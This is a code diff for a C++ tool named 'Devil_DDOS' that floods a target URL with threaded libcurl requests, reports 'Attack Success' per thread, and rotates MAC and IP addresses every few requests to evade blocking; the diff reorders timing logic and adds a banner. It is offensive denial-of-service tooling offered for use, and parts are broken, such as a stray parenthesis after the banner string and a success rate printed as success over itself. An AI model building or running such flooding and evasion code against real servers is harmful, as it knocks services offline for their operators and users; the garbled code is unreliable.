@@ -1,5 +1,4 @@
 #include <iostream>
-#include <fstream>
 #include <sstream>
 #include <vector>
 #include <thread>
@@ -11,9 +10,9 @@
 using namespace std;
 using namespace chrono;
 
-#define CYAN    "\033[1;36m"
-#define GREEN   "\033[1;32m"
 #define RED     "\033[1;31m"
+#define GREEN   "\033[1;32m"
+#define CYAN    "\033[1;36m"
 #define YELLOW  "\033[1;33m"
 #define RESET   "\033[0m"
 #define BOLD    "\033[1m"
@@ -72,23 +71,23 @@ void https_attack(const string& url, const string& method, int id, int interval,
             curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
 
             // Send the request and check the response
+            auto start = system_clock::now();
             res = curl_easy_perform(curl);
+            auto end = system_clock::now();
+            auto duration = duration_cast<milliseconds>(end - start);
+
+            if (res == CURLE_OK) {
+                success++;
+                cout << GREEN << "[T" << id << "] Attack Success (" << duration.count() << "ms)" << RESET << endl;
+            } else {
+                cout << RED << "[T" << id << "] Failed: " << curl_easy_strerror(res) << RESET << endl;
+                break;
+            }
 
             // Change MAC and IP every 'interval' seconds
             if (success % interval == 0) {
                 change_mac();
                 change_ip();
-            }
-
-            if (res == CURLE_OK) {
-                success++;
-                double rtt = duration_cast<milliseconds>(high_resolution_clock::now() - chrono::steady_clock::now()).count();
-                total_time += rtt;
-                cout << GREEN << "[T" << id << "] Attack Success (" << rtt << "ms)" << RESET << endl;
-            } else {
-                // If the server is unreachable or responds with an error code, stop
-                cout << RED << "[T" << id << "] Failed: " << curl_easy_strerror(res) << RESET << endl;
-                break;
             }
 
             curl_easy_cleanup(curl);
@@ -105,6 +104,20 @@ void https_attack(const string& url, const string& method, int id, int interval,
     log << "[Thread " << id << "] Success: " << success << ", Avg RTT: " << avg_time << "ms\n";
 
     cout << YELLOW << "[T" << id << "] Attack Completed. Success Rate: " << success << "/" << success << RESET << endl;
+}
+
+// Function to print the banner with "Devil_DDOS" in red color
+void print_banner() {
+    cout << RED << R"(
+██████╗ ███████╗██╗     ███████╗██╗██╗     ███████╗
+██╔══██╗██╔════╝██║     ██╔════╝██║██║     ██╔════╝
+██║  ██║█████╗  ██║     █████╗  ██║██║     █████╗  
+██║  ██║██╔══╝  ██║     ██╔══╝  ██║██║     ██╔══╝  
+██████╔╝███████╗██████╗ ███████╗██║███████╗███████╗
+╚═════╝ ╚══════╝╚═════╝ ╚══════╝╚═╝╚══════╝╚══════╝
+                                                        
+[+] Devil_DDOS Tool Initialized 🔥)" << RESET << endl;)
+
 }
 
 int main() {
